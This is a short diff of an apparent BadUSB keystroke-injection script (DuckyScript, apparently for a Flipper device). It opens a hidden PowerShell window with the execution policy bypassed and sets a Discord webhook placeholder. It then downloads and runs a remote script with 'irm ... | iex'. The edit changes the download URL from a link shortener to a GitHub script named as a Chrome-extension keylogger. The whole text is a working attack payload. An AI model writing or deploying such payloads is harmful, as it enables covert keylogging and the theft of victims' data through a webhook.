@@ -12,5 +12,5 @@ REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://t.ly/rJl5k | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/brikodepo/Flipper/refs/heads/main/Chrome-Extension-Keylogger/main.ps1 | iex
 ENTER
